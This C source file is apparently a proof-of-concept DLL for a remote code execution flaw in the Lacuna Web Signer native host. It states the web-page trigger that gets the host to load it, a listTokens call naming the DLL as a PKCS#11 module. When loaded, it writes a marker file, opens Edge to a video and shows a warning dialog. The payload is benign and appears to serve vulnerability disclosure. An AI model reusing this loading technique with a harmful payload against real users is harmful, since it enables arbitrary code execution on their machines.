/* Web Signer benign RCE proof — now also launches Edge to a video (rickroll),
 * mirroring the BRy payload, to show arbitrary process execution from inside
 * the signing host. 32-bit DLL (host is i386). */
#include <windows.h>

#define MARKER_SUFFIX "\\websigner_pwned.txt"
#define MSG_TITLE     "Web Signer - RCE proof of concept (benign)"

static const char *MSG_BODY =
    "This dialog was rendered by Lacuna.WebPKI.ChromeWin.exe.\r\n"
    "Arbitrary code is executing inside the Web Signer native host as the\r\n"
    "logged-in user, triggered by a web page through the browser extension.\r\n\r\n"
    "Trigger:  listTokens { pkcs11Modules: [<this DLL>] }  ->  LoadLibrary  ->  DllMain";

static void write_marker(void)
{
    char path[MAX_PATH];
    DWORD n = GetEnvironmentVariableA("TEMP", path, MAX_PATH);
    if (n == 0 || n >= MAX_PATH - (DWORD)sizeof(MARKER_SUFFIX))
        lstrcpynA(path, "C:\\Windows\\Temp", MAX_PATH);
    lstrcatA(path, MARKER_SUFFIX);
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    char host[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, host, MAX_PATH);
    char buf[1024];
    int len = wsprintfA(buf,
        "Web Signer RCE PoC - DllMain executed inside the signing host process\r\n"
        "host pid     : %lu\r\n"
        "host module  : %s\r\n",
        GetCurrentProcessId(), host);
    DWORD written = 0;
    WriteFile(h, buf, (DWORD)len, &written, NULL);
    CloseHandle(h);
}

static void launch_video(void)
{
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof si); si.cb = sizeof si;
    ZeroMemory(&pi, sizeof pi);
    char cmdline[] = "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" "
                     "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    if (CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    }
}

static DWORD WINAPI worker(LPVOID unused)
{
    (void)unused;
    write_marker();
    launch_video();
    MessageBoxA(NULL, MSG_BODY, MSG_TITLE,
                MB_OK | MB_ICONWARNING | MB_TOPMOST | MB_SETFOREGROUND | MB_SYSTEMMODAL);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinst);
        HMODULE self = NULL;
        GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_PIN |
                           GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
                           (LPCSTR)(void *)&DllMain, &self);
        HANDLE t = CreateThread(NULL, 0, worker, NULL, 0, NULL);
        if (t) CloseHandle(t);
    }
    return TRUE;
}
